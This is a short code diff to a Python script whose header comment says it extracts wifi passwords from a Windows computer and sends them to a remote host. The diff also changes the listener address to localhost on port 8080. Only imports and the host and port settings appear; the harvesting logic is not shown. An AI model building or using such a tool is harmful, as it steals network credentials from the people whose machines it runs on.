@@ -1,3 +1,11 @@
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+#       Author:     Safwan aka Hammer                                                       #
+#       Date:       Friday, 19 March 2021 8:47:58 PM                                        #
+#       Brief:      This program will extract wifi passwords from windows computer to the   #
+#                   HOST                                                                    #
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+
 import ctypes
 import os
 import subprocess as sp
@@ -5,7 +13,7 @@ import shutil
 import socket
 
 
-HOST = '10.0.2.15'
+HOST = '127.0.0.1'
 PORT = 8080
 
 
